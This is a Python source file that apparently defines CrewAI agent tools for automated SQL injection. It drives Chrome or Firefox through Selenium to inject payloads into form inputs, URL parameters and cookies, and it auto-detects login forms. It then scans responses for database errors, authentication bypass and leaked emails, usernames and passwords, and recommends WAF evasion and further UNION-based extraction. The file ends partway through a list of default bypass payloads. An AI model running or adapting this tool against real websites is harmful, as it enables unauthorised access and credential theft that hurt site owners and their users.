from crewai.tools import BaseTool
from typing import Type, List, Dict, Any
from pydantic import BaseModel, Field
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException, ElementNotInteractableException, UnexpectedAlertPresentException, StaleElementReferenceException
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
import time
import re
import os
import base64
import platform
import logging
import yaml
from datetime import datetime
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class BrowserAutomationToolInput(BaseModel):
    """Input schema for BrowserAutomationTool."""
    target_url: str = Field(..., description="URL of the target website.")
    payload: str = Field(..., description="SQL injection payload to inject.")
    entry_point: Dict[str, Any] = Field(..., description="Entry point details (type, location, selector).")
    capture_screenshot: bool = Field(default=True, description="Whether to capture a screenshot of the response.")

class BrowserAutomationTool(BaseTool):
    name: str = "Browser Automation Tool"
    description: str = (
        "Automates browser interactions to inject SQL payloads into websites and capture the results."
    )
    args_schema: Type[BaseModel] = BrowserAutomationToolInput

    def _run(self, target_url: str, payload: str, entry_point: Dict[str, Any], capture_screenshot: bool = True) -> str:
        try:
            logger.info(f"Starting Chrome browser automation for URL: {target_url}")
            # Set up Chrome options
            chrome_options = ChromeOptions()
            
            # Only use headless mode if not debugging
            chrome_options.add_argument("--headless=new")  # Using the newer headless mode
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")  # Set a reasonable window size
            
            # Add user agent to appear more like a regular browser
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36")
            
            logger.info("Setting up Chrome WebDriver")
            # Set up the WebDriver
            try:
                service = ChromeService(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=chrome_options)
                logger.info("Chrome WebDriver initialized successfully")
            except WebDriverException as e:
                logger.error(f"Failed to initialize Chrome WebDriver: {str(e)}")
                return f"Error: Chrome WebDriver initialization failed: {str(e)}"
            
            # Navigate to the URL with timeout and error handling
            try:
                logger.info(f"Navigating to URL: {target_url}")
                driver.set_page_load_timeout(15)  # 15 second timeout for page load
                driver.get(target_url)
                logger.info("Successfully loaded the page")
            except Exception as e:
                logger.error(f"Failed to load URL {target_url}: {str(e)}")
                driver.quit()
                return f"Error: Failed to load URL {target_url}: {str(e)}"
            
            # Wait for the page to load (shorter implicit wait)
            driver.implicitly_wait(2)
            
            # Extract entry point details
            entry_type = entry_point.get('type', 'unknown')
            selector = entry_point.get('selector', '')
            selector_type = entry_point.get('selector_type', 'css')
            
            logger.info(f"Executing injection via {entry_type} at {selector}")
            # Execute the injection based on entry type
            injection_result = self._execute_injection(
                driver, entry_type, selector, selector_type, payload, capture_screenshot
            )
            
            # Clean up
            logger.info("Closing Chrome browser")
            driver.quit()
            
            return injection_result
            
        except Exception as e:
            logger.error(f"Error during browser automation: {str(e)}")
            return f"Error during browser automation: {str(e)}"
    
    def _execute_injection(self, driver, entry_type, selector, selector_type, payload, capture_screenshot):
        result = {
            'success': False,
            'response_text': '',
            'screenshot_path': None,
            'error_message': None
        }
        
        try:
            # Find the target element with better error handling
            logger.info(f"Looking for element with selector '{selector}' using {selector_type}")
            try:
                if selector_type.lower() == 'xpath':
                    element = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.XPATH, selector))
                    )
                else:  # Default to CSS selector
                    element = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                logger.info("Element found successfully")
            except TimeoutException:
                logger.error(f"Element with selector '{selector}' not found within timeout period")
                result['error_message'] = f"Could not find element with selector: {selector}"
                return self._format_result(result)
            
            # Perform the injection based on entry type
            if entry_type == 'form_input':
                logger.info("Performing form input injection")
                # Clear existing content and inject payload into form input
                element.clear()
                element.send_keys(payload)
                logger.info(f"Payload injected: {payload}")
                
                # First try: Press Enter directly on the element
                try:
                    logger.info("Submitting form by pressing Enter key")
                    element.send_keys(Keys.RETURN)
                    success = True
                except Exception as e:
                    logger.warning(f"Enter key submission failed: {str(e)}")
                    success = False
                
                # Second try: Look for a submit button if Enter didn't work
                if not success:
                    try:
                        logger.info("Looking for submit button")
                        if element.get_attribute('form'):
                            form_id = element.get_attribute('form')
                            form = driver.find_element(By.ID, form_id)
                            submit_button = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                        else:
                            form = element.find_element(By.XPATH, './ancestor::form')
                            submit_button = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                        
                        logger.info("Submit button found, clicking")
                        submit_button.click()
                    except NoSuchElementException:
                        logger.warning("No submit button found")
                    except Exception as e:
                        logger.warning(f"Submit button click failed: {str(e)}")
                        
                    # Third try: Try JavaScript submission
                    try:
                        logger.info("Attempting form submission via JavaScript")
                        if element.get_attribute('form'):
                            form_id = element.get_attribute('form')
                            driver.execute_script(f"document.getElementById('{form_id}').submit();")
                        else:
                            driver.execute_script("arguments[0].form.submit();", element)
                    except Exception as e:
                        logger.warning(f"JavaScript form submission failed: {str(e)}")
                
            elif entry_type == 'url_parameter':
                logger.info("Performing URL parameter injection")
                # For URL parameters, we need to modify the URL directly
                current_url = driver.current_url
                if '?' in current_url:
                    modified_url = f"{current_url}&{selector}={payload}"
                else:
                    modified_url = f"{current_url}?{selector}={payload}"
                
                logger.info(f"Navigating to modified URL: {modified_url}")
                driver.get(modified_url)
                
            elif entry_type == 'cookie':
                logger.info("Performing cookie-based injection")
                # For cookie-based injections
                driver.add_cookie({'name': selector, 'value': payload})
                logger.info("Cookie set, refreshing page")
                driver.refresh()  # Refresh to apply the cookie
                
            else:
                logger.info(f"Unknown entry type '{entry_type}', defaulting to form input")
                # Default to form input
                element.clear()
                element.send_keys(payload)
                logger.info(f"Payload injected: {payload}")
                
                # Try to find the closest form and submit it
                try:
                    logger.info("Looking for form and submit button")
                    form = element.find_element(By.XPATH, './ancestor::form')
                    submit_button = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                    logger.info("Form and submit button found, clicking")
                    submit_button.click()
                except NoSuchElementException:
                    logger.info("No form or submit button found, pressing Enter instead")
                    # If no submit button, try pressing Enter
                    element.send_keys("\n")
            
            # Wait for the page to load after submission
            logger.info("Waiting for response...")
            time.sleep(1)
            
            # Capture the response
            result['response_text'] = driver.page_source
            result['success'] = True
            logger.info("Response captured successfully")
            
            # Capture a screenshot if requested
            if capture_screenshot:
                logger.info("Capturing screenshot")
                timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
                screenshot_dir = "screenshots"
                os.makedirs(screenshot_dir, exist_ok=True)
                screenshot_path = f"{screenshot_dir}/injection_{timestamp}.png"
                driver.save_screenshot(screenshot_path)
                result['screenshot_path'] = screenshot_path
                logger.info(f"Screenshot saved to {screenshot_path}")
                
                # Also encode the screenshot as base64 for inline viewing
                with open(screenshot_path, "rb") as img_file:
                    result['screenshot_base64'] = base64.b64encode(img_file.read()).decode()
            
        except Exception as e:
            logger.error(f"Error in _execute_injection: {str(e)}")
            result['error_message'] = str(e)
        
        # Format and return the result
        return self._format_result(result)
        
    def _format_result(self, result):
        # Format the result as a string for return
        formatted_result = "SQL Injection Execution Result\n\n"
        
        if result['success']:
            formatted_result += "Execution Status: Success\n\n"
        else:
            formatted_result += f"Execution Status: Failed\n"
            formatted_result += f"Error: {result['error_message']}\n\n"
        
        formatted_result += "Response Analysis:\n"
        
        # Check for signs of successful injection
        if result.get('response_text'):
            # Look for database errors in the response
            db_error_patterns = [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
                r"valid MySQL result", r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
                r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"Warning.*mssql_.*",
                r"SQLite/JDBCDriver", r"SQLite.Exception", r"PostgreSQL.*ERROR"
            ]
            
            for pattern in db_error_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Database Error Detected: {match.group(0)}\n"
            
            # Look for signs of authentication bypass
            auth_success_patterns = [
                r"Welcome.*admin", r"successfully logged in", r"authentication successful",
                r"logged in as", r"login successful", r"access granted"
            ]
            
            for pattern in auth_success_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Authentication Bypass Detected: {match.group(0)}\n"
            
            # Look for signs of data leakage
            data_patterns = [
                r"<td>\s*\d+\s*</td>", r"<td>.*?@.*?</td>",  # Email pattern in table cell
                r"<td>.*?password.*?</td>", r"username.*?password"
            ]
            
            for pattern in data_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Possible Data Leakage Detected: {match.group(0)}\n"
        
        if result.get('screenshot_path'):
            formatted_result += f"\nScreenshot saved to: {result['screenshot_path']}\n"
        
        return formatted_result


class ResponseAnalyzerToolInput(BaseModel):
    """Input schema for ResponseAnalyzerTool."""
    response_html: str = Field(..., description="HTML response from the injection attempt.")
    payload: str = Field(..., description="SQL injection payload that was used.")
    db_type: str = Field(default="unknown", description="Database type if known (MySQL, PostgreSQL, etc.).")

class ResponseAnalyzerTool(BaseTool):
    name: str = "SQL Injection Response Analyzer"
    description: str = (
        "Analyzes the response from a SQL injection attempt to determine if it was successful and extract relevant data."
    )
    args_schema: Type[BaseModel] = ResponseAnalyzerToolInput

    def _run(self, response_html: str, payload: str, db_type: str = "unknown") -> str:
        try:
            # Analyze the response for different types of injection success indicators
            analysis_results = {
                'error_based': self._analyze_for_errors(response_html, db_type),
                'auth_bypass': self._analyze_for_auth_bypass(response_html, payload),
                'data_leakage': self._analyze_for_data_leakage(response_html, payload),
                'blind_injection': self._analyze_for_blind_injection(response_html, payload)
            }
            
            # Format the results
            result_str = "SQL Injection Response Analysis\n\n"
            result_str += f"Payload Used: `{payload}`\n"
            result_str += f"Database Type: {db_type.upper() if db_type != 'unknown' else 'Unknown'}\n\n"
            
            # Overall success determination
            success = any([
                analysis_results['error_based']['success'],
                analysis_results['auth_bypass']['success'],
                analysis_results['data_leakage']['success'],
                analysis_results['blind_injection']['success']
            ])
            
            result_str += f"Overall Success: {'Yes' if success else 'No'}\n\n"
            
            # Error-based injection results
            result_str += "Error-Based Injection:\n"
            if analysis_results['error_based']['success']:
                result_str += f"  - Success: Yes\n"
                result_str += f"  - Error Message: {analysis_results['error_based']['message']}\n"
                if analysis_results['error_based'].get('db_info'):
                    result_str += f"  - Database Info: {analysis_results['error_based']['db_info']}\n"
            else:
                result_str += "  - Success: No\n"
            
            # Authentication bypass results
            result_str += "\nAuthentication Bypass:\n"
            if analysis_results['auth_bypass']['success']:
                result_str += f"  - Success: Yes\n"
                result_str += f"  - Evidence: {analysis_results['auth_bypass']['message']}\n"
            else:
                result_str += "  - Success: No\n"
            
            # Data leakage results
            result_str += "\nData Leakage:\n"
            if analysis_results['data_leakage']['success']:
                result_str += f"  - Success: Yes\n"
                result_str += f"  - Data Found:\n"
                for data in analysis_results['data_leakage']['data']:
                    result_str += f"    * {data}\n"
            else:
                result_str += "  - Success: No\n"
            
            # Blind injection results
            result_str += "\nBlind Injection:\n"
            if analysis_results['blind_injection']['success']:
                result_str += f"  - Success: Yes\n"
                result_str += f"  - Evidence: {analysis_results['blind_injection']['message']}\n"
            else:
                result_str += "  - Success: No\n"
            
            # Additional analysis and recommendations
            result_str += "\nRecommendations:\n"
            
            if success:
                result_str += "  - The injection was successful. Consider using the following techniques:\n"
                
                if analysis_results['error_based']['success']:
                    result_str += "    * Refine error-based payloads to extract more information\n"
                    
                if analysis_results['auth_bypass']['success']:
                    result_str += "    * Try accessing protected areas with the bypass technique\n"
                    
                if analysis_results['data_leakage']['success']:
                    result_str += "    * Expand UNION queries to extract more columns or tables\n"
                    
                if analysis_results['blind_injection']['success']:
                    result_str += "    * Use boolean or time-based techniques for further exploitation\n"
            else:
                result_str += "  - The injection appears unsuccessful. Consider the following:\n"
                result_str += "    * Try different encoding techniques to bypass WAF protection\n"
                result_str += "    * Adjust the payload syntax for the specific database type\n"
                result_str += "    * Attempt blind injection techniques if direct methods fail\n"
            
            return result_str
            
        except Exception as e:
            return f"Error analyzing SQL injection response: {str(e)}"
    
    def _analyze_for_errors(self, response_html, db_type):
        result = {
            'success': False,
            'message': None,
            'db_info': None
        }
        
        # Database-specific error patterns
        error_patterns = {
            "mysql": [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
                r"valid MySQL result", r"check the manual that corresponds to your MySQL server version",
                r"MySQL server version for the right syntax"
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR", r"Warning.*pg_.*", r"PG::SyntaxError:",
                r"ERROR:  syntax error at or near", r"ERROR:  unterminated quoted string at or near"
            ],
            "sqlite": [
                r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*", r"near \".*\": syntax error", r"\[SQLITE_ERROR\]"
            ],
            "sql server": [
                r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"Warning.*mssql_.*", r"Warning.*sqlsrv_.*",
                r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
                r"Unclosed quotation mark after the character string"
            ],
            "oracle": [
                r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*", r"Warning.*ora_.*",
                r"SQL command not properly ended", r"quoted string not properly terminated"
            ]
        }
        
        # If db_type is known, check those patterns first
        if db_type.lower() in error_patterns:
            for pattern in error_patterns[db_type.lower()]:
                match = re.search(pattern, response_html, re.IGNORECASE)
                if match:
                    result['success'] = True
                    result['message'] = match.group(0)
                    break
        
        # If no match found or db_type unknown, check all patterns
        if not result['success']:
            for db, patterns in error_patterns.items():
                for pattern in patterns:
                    match = re.search(pattern, response_html, re.IGNORECASE)
                    if match:
                        result['success'] = True
                        result['message'] = match.group(0)
                        result['db_info'] = f"Database type appears to be {db.upper()}"
                        break
                if result['success']:
                    break
        
        # Look for version information in errors
        if result['success']:
            version_patterns = [
                r"MySQL[\s/]*([\d\.]+)",
                r"PostgreSQL ([\d\.]+)",
                r"Microsoft SQL Server ([\d\.]+)",
                r"Oracle Database ([\d\.]+)",
                r"SQLite version ([\d\.]+)"
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, response_html, re.IGNORECASE)
                if match:
                    result['db_info'] = f"{result.get('db_info', 'Database')} version {match.group(1)}"
                    break
        
        return result
    
    def _analyze_for_auth_bypass(self, response_html, payload):
        result = {
            'success': False,
            'message': None
        }
        
        # Check if the payload was intended for auth bypass
        auth_bypass_intent = any(x in payload.lower() for x in ["or 1=1", "or '1'='1'", "or 1 like 1", "admin'--"])
        
        if not auth_bypass_intent:
            result['message'] = "Payload does not appear to be an authentication bypass attempt"
            return result
        
        # Check for signs of successful login or authentication
        auth_success_patterns = [
            r"Welcome.*admin", r"successfully logged in", r"authentication successful",
            r"logged in as", r"login successful", r"access granted", r"dashboard",
            r"profile", r"logout", r"sign out", r"account settings"
        ]
        
        for pattern in auth_success_patterns:
            match = re.search(pattern, response_html, re.IGNORECASE)
            if match:
                result['success'] = True
                result['message'] = f"Authentication bypass succeeded: {match.group(0)}"
                break
        
        if not result['success']:
            result['message'] = "No evidence of successful authentication bypass"
        
        return result
    
    def _analyze_for_data_leakage(self, response_html, payload):
        result = {
            'success': False,
            'data': []
        }
        
        # Check if the payload was intended for data extraction
        data_extraction_intent = "union select" in payload.lower()
        
        if not data_extraction_intent:
            return result
        
        # Check for table structures in the response
        table_pattern = r"<table.*?>.*?</table>"
        tables = re.findall(table_pattern, response_html, re.IGNORECASE | re.DOTALL)
        
        if tables:
            # Extract rows from tables
            for table in tables:
                row_pattern = r"<tr.*?>.*?</tr>"
                rows = re.findall(row_pattern, table, re.IGNORECASE | re.DOTALL)
                
                for row in rows:
                    cell_pattern = r"<td.*?>(.*?)</td>"
                    cells = re.findall(cell_pattern, row, re.IGNORECASE | re.DOTALL)
                    
                    if cells:
                        # Look for sensitive data patterns in cells
                        for cell in cells:
                            # Email pattern
                            email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', cell)
                            if email_match:
                                result['success'] = True
                                result['data'].append(f"Email: {email_match.group(0)}")
                            
                            # Password-like pattern
                            if 'password' in row.lower() and cell.strip():
                                result['success'] = True
                                cleaned_cell = re.sub(r'<.*?>', '', cell).strip()
                                result['data'].append(f"Possible Password: {cleaned_cell}")
                            
                            # Username-like pattern
                            if 'user' in row.lower() and cell.strip() and len(cell) < 30:
                                result['success'] = True
                                cleaned_cell = re.sub(r'<.*?>', '', cell).strip()
                                result['data'].append(f"Possible Username: {cleaned_cell}")
        
        # Look for structured data that might indicate a successful UNION SELECT
        if "1,2,3" in response_html or "null,null,null" in response_html.lower():
            result['success'] = True
            result['data'].append("UNION SELECT column placeholders visible in output")
        
        # Look for database metadata
        metadata_patterns = [
            r"information_schema\.[a-z_]+",
            r"sys\.[a-z_]+",
            r"sqlite_master",
            r"all_tables",
            r"pg_catalog"
        ]
        
        for pattern in metadata_patterns:
            match = re.search(pattern, response_html, re.IGNORECASE)
            if match:
                result['success'] = True
                result['data'].append(f"Database metadata: {match.group(0)}")
        
        return result
    
    def _analyze_for_blind_injection(self, response_html, payload):
        result = {
            'success': False,
            'message': None
        }
        
        # Check for boolean-based blind patterns
        if " and 1=1" in payload.lower() or " and 1=2" in payload.lower():
            # For boolean-based, compare response length or content
            # This is a simplified check that would need more context
            if " and 1=1" in payload.lower() and len(response_html) > 1000:
                result['success'] = True
                result['message'] = "Boolean-based injection may be successful (positive condition)"
            elif " and 1=2" in payload.lower() and len(response_html) < 1000:
                result['success'] = True
                result['message'] = "Boolean-based injection may be successful (negative condition)"
        
        # Check for time-based blind patterns
        if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower() or "waitfor delay" in payload.lower():
            # This would typically require timing information that we don't have in just the HTML
            # For analysis we'll look for signs that the query completed
            if "timed out" not in response_html.lower() and "error" not in response_html.lower():
                result['success'] = True
                result['message'] = "Time-based injection may be successful (query completed)"
        
        return result

class FirefoxBrowserAutomationToolInput(BaseModel):
    """Input schema for FirefoxBrowserAutomationTool."""
    target_url: str = Field(..., description="URL of the target website.")
    payload: str = Field(..., description="SQL injection payload to inject.")
    entry_point: Dict[str, Any] = Field(..., description="Entry point details (type, location, selector or form_fields).")
    capture_screenshot: bool = Field(default=True, description="Whether to capture a screenshot of the response.")
    max_retries: int = Field(default=2, description="Maximum number of retries for failed operations.")
    popup_timeout: int = Field(default=2, description="Timeout in seconds for popup detection.")
    visible_mode: bool = Field(default=False, description="Run Firefox in visible mode (non-headless) to see the injection in real-time.")

class FirefoxBrowserAutomationTool(BaseTool):
    name: str = "Firefox Browser Automation Tool"
    description: str = (
        "Automates Firefox browser interactions to inject SQL payloads into websites and capture the results."
    )
    args_schema: Type[BaseModel] = FirefoxBrowserAutomationToolInput

    def _run(self, target_url: str, payload: str, entry_point: Dict[str, Any], capture_screenshot: bool = True, 
             max_retries: int = 2, popup_timeout: int = 2, visible_mode: bool = False) -> str:
        driver = None
        try:
            logger.info(f"Starting Firefox browser automation for URL: {target_url}")
            # Set up Firefox options
            firefox_options = FirefoxOptions()
            if not visible_mode:
                firefox_options.add_argument("--headless")
            
            # Set up the Firefox driver
            service = FirefoxService(GeckoDriverManager().install())
            driver = webdriver.Firefox(service=service, options=firefox_options)
            
            # Navigate to the target URL
            logger.info(f"Navigating to {target_url}")
            driver.get(target_url)
            
            # Wait for the page to load
            time.sleep(2)
            
            # Handle any initial alerts or popups
            self._handle_alerts_and_popups(driver, popup_timeout)
            
            # Extract entry point details and validate
            if not isinstance(entry_point, dict):
                logger.error(f"Invalid entry_point format: {entry_point}")
                driver.quit()
                return f"Error: entry_point must be a dictionary, got {type(entry_point)}"
            
            entry_type = entry_point.get('type', 'unknown')
            selector = entry_point.get('selector', '')
            selector_type = entry_point.get('selector_type', 'css')
            form_fields = entry_point.get('form_fields', {})
            
            # If we have empty selector and no form_fields, try to auto-detect form fields
            if not selector and not form_fields:
                logger.info("No selector or form_fields provided, attempting to auto-detect login form fields")
                form_fields = self._auto_detect_form_fields(driver)
                if form_fields:
                    logger.info(f"Auto-detected form fields: {list(form_fields.keys())}")
                    return self._execute_form_fields_injection(
                        driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout
                    )
            
            # If form_fields are provided, use them
            if form_fields:
                logger.info("Using provided form fields for injection")
                return self._execute_form_fields_injection(
                    driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout
                )
            
            # If we have a selector but no form_fields, try to detect the form structure
            if selector:
                try:
                    # First try to find the element directly
                    element = None
                    try:
                        if selector_type == 'css':
                            element = driver.find_element(By.CSS_SELECTOR, selector)
                        elif selector_type == 'xpath':
                            element = driver.find_element(By.XPATH, selector)
                        elif selector_type == 'id':
                            element = driver.find_element(By.ID, selector)
                        else:
                            logger.warning(f"Unknown selector type '{selector_type}', defaulting to CSS")
                            element = driver.find_element(By.CSS_SELECTOR, selector)
                    except NoSuchElementException:
                        pass
                    
                    # If element found, check if it's part of a form
                    if element:
                        # Try to find parent form or form container
                        form = None
                        try:
                            # Try direct parent form first
                            form = element.find_element(By.XPATH, "./ancestor::form")
                        except NoSuchElementException:
                            try:
                                # Try finding form by ID reference
                                form_id = element.get_attribute('form')
                                if form_id:
                                    form = driver.find_element(By.ID, form_id)
                            except NoSuchElementException:
                                # If no form found, look for common login form containers
                                containers = driver.find_elements(By.CSS_SELECTOR, 
                                    '#login-form, .login-form, [id*="login-container"], [class*="login-container"]')
                                if containers:
                                    form = containers[0]
                        
                        if form:
                            logger.info("Found parent form/container, attempting to detect all form fields")
                            # Try to detect all fields in the form
                            form_fields = {}
                            
                            # Store the form container reference
                            form_fields['form_container'] = form.get_attribute('id') or form.get_attribute('class')
                            
                            # Add the originally targeted field
                            field_type = element.get_attribute('type') or 'text'
                            if field_type == 'password':
                                form_fields['password'] = selector
                            else:
                                form_fields['username'] = selector
                            
                            # Look for other fields in the same form
                            if field_type != 'password':
                                # Look for password field
                                try:
                                    password_field = form.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                                    form_fields['password'] = 'input[type="password"]'
                                except NoSuchElementException:
                                    pass
                            else:
                                # Look for username/email field
                                for username_selector in [
                                    'input[type="text"]', 'input[type="email"]',
                                    'input[name*="user"]', 'input[name*="email"]',
                                    'input[id*="user"]', 'input[id*="email"]'
                                ]:
                                    try:
                                        username_field = form.find_element(By.CSS_SELECTOR, username_selector)
                                        if username_field.is_displayed() and username_field.is_enabled():
                                            form_fields['username'] = username_selector
                                            break
                                    except NoSuchElementException:
                                        continue
                            
                            if len(form_fields) > 1:  # More than just the form_container
                                logger.info(f"Detected multiple form fields: {list(form_fields.keys())}")
                                return self._execute_form_fields_injection(
                                    driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout
                                )
                    
                    # If we couldn't detect a form structure, fall back to single field injection
                    logger.info("No form structure detected, falling back to single field injection")
                    return self._execute_injection(
                        driver, entry_type, selector, selector_type, payload, 
                        capture_screenshot, max_retries, popup_timeout
                    )
                    
                except Exception as e:
                    logger.error(f"Error during form structure detection: {str(e)}")
                    # Fall back to single field injection
                    return self._execute_injection(
                        driver, entry_type, selector, selector_type, payload,
                        capture_screenshot, max_retries, popup_timeout
                    )
            
            # If we get here, we have no selector and couldn't auto-detect fields
            logger.warning("No valid entry point found, attempting to find any input field")
            selector = 'input[type="text"]'  # Default to a common input type
            return self._execute_injection(
                driver, 'form_input', selector, 'css', payload,
                capture_screenshot, max_retries, popup_timeout
            )
            
        except Exception as e:
            error_msg = f"Error during browser automation: {str(e)}"
            logger.error(error_msg)
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            return error_msg
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    def _auto_detect_form_fields(self, driver):
        """
        Automatically detect common form fields like username, email, password, etc.
        
        Args:
            driver: Selenium WebDriver instance
            
        Returns:
            Dictionary of detected form fields
        """
        logger.info("Attempting to auto-detect form fields")
        form_fields = {}
        
        # Common selectors for username/email fields (in order of preference)
        username_selectors = [
            # By input type and name
            'input[type="text"][name*="user"]', 'input[type="text"][name*="email"]',
            'input[type="email"]', 'input[name*="user"]', 'input[name*="email"]',
            # By ID
            'input[id*="user"]', 'input[id*="email"]', 'input[id*="username"]', 'input[id*="login"]',
            # By placeholder
            'input[placeholder*="user"]', 'input[placeholder*="email"]', 
            'input[placeholder*="Email"]', 'input[placeholder*="Username"]',
            # By class
            'input[class*="user"]', 'input[class*="email"]', 'input[class*="login"]',
            # By aria-label
            'input[aria-label*="user" i]', 'input[aria-label*="email" i]', 'input[aria-label*="username" i]',
            # Generic text inputs within login forms
            '#login-form input[type="text"]', '.login-form input[type="text"]',
            'form[id*="login"] input[type="text"]', 'form[class*="login"] input[type="text"]',
            'div[id*="login"] input[type="text"]', 'div[class*="login"] input[type="text"]'
        ]
        
        # Common selectors for password fields (in order of preference)
        password_selectors = [
            # By type
            'input[type="password"]',
            # By name
            'input[name*="pass"]', 'input[name*="pwd"]',
            # By ID
            'input[id*="pass"]', 'input[id*="pwd"]', 'input[id*="password"]',
            # By placeholder
            'input[placeholder*="password"]', 'input[placeholder*="Password"]',
            # By class
            'input[class*="password"]', 'input[class*="pass"]',
            # By aria-label
            'input[aria-label*="password" i]',
            # Generic password inputs within login forms
            '#login-form input[type="password"]', '.login-form input[type="password"]',
            'form[id*="login"] input[type="password"]', 'form[class*="login"] input[type="password"]',
            'div[id*="login"] input[type="password"]', 'div[class*="login"] input[type="password"]'
        ]
        
        # Try to find username/email field
        for selector in username_selectors:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                for element in elements:
                    if element.is_displayed() and element.is_enabled():
                        logger.info(f"Found username/email field with selector: {selector}")
                        form_fields['username'] = selector
                        break
                if 'username' in form_fields:
                    break
            except Exception as e:
                logger.debug(f"Error finding username field with selector {selector}: {str(e)}")
                continue
        
        # Try to find password field
        for selector in password_selectors:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                for element in elements:
                    if element.is_displayed() and element.is_enabled():
                        logger.info(f"Found password field with selector: {selector}")
                        form_fields['password'] = selector
                        break
                if 'password' in form_fields:
                    break
            except Exception as e:
                logger.debug(f"Error finding password field with selector {selector}: {str(e)}")
                continue
        
        # If we found fields, try to find their common ancestor form
        if form_fields:
            try:
                # Get the first found field
                first_field_selector = next(iter(form_fields.values()))
                first_field = driver.find_element(By.CSS_SELECTOR, first_field_selector)
                
                # Try to find the form element
                form = None
                try:
                    # Try direct parent form first
                    form = first_field.find_element(By.XPATH, "./ancestor::form")
                except NoSuchElementException:
                    try:
                        # Try finding form by ID reference
                        form_id = first_field.get_attribute('form')
                        if form_id:
                            form = driver.find_element(By.ID, form_id)
                    except NoSuchElementException:
                        # If no form found, look for common login form containers
                        containers = driver.find_elements(By.CSS_SELECTOR, 
                            '#login-form, .login-form, [id*="login-container"], [class*="login-container"]')
                        if containers:
                            form = containers[0]
                
                if form:
                    logger.info("Found parent form/container for the login fields")
                    # Store the form ID or a reference for later use
                    form_fields['form_container'] = form.get_attribute('id') or form.get_attribute('class')
            except Exception as e:
                logger.warning(f"Error finding parent form: {str(e)}")
        
        # Log the detected fields
        if form_fields:
            logger.info(f"Auto-detected {len(form_fields)} form fields: {list(form_fields.keys())}")
        else:
            logger.warning("No form fields were auto-detected")
            
        return form_fields
        
    def _execute_with_multiple_payloads(self, driver, form_fields, initial_payload, capture_screenshot, max_retries, popup_timeout):
        """
        Execute injection with multiple different payloads if the first one fails.
        
        Args:
            driver: Selenium WebDriver instance
            form_fields: Dictionary of form fields to inject into
            initial_payload: Initial payload to try
            capture_screenshot: Whether to capture screenshots
            max_retries: Maximum number of retries for each payload
            popup_timeout: Timeout for popup detection
            
        Returns:
            Formatted result string
        """
        logger.info("Executing injection with multiple fallback payloads")
        
        # Check if custom payloads file exists and is not empty
        custom_payloads = []
        custom_payloads_file = "custom_payloads.yaml"
        try:
            if os.path.exists(custom_payloads_file):
                logger.info(f"Found custom payloads file: {custom_payloads_file}")
                with open(custom_payloads_file, 'r') as file:
                    yaml_content = yaml.safe_load(file)
                    if yaml_content and 'payloads' in yaml_content and yaml_content['payloads']:
                        custom_payloads = yaml_content['payloads']
                        logger.info(f"Loaded {len(custom_payloads)} custom payloads from {custom_payloads_file}")
                        if len(custom_payloads) > 0:
                            logger.info(f"First custom payload: {custom_payloads[0]}")
                    else:
                        logger.warning("Custom payloads file exists but contains no payloads or has invalid format")
            else:
                logger.info(f"No custom payloads file found at: {custom_payloads_file}")
        except Exception as e:
            logger.warning(f"Error loading custom payloads: {str(e)}")
        
        # List of payloads to try in order
        if custom_payloads:
            payloads = custom_payloads
            logger.info("USING CUSTOM PAYLOADS instead of default payloads")
        else:
            # Default payloads if no custom ones are provided
            payloads = [
                initial_payload,  # Start with the provided payload
                "' OR '1'='1",    # Classic authentication bypass
                "admin' --",      # Another common authentication bypass
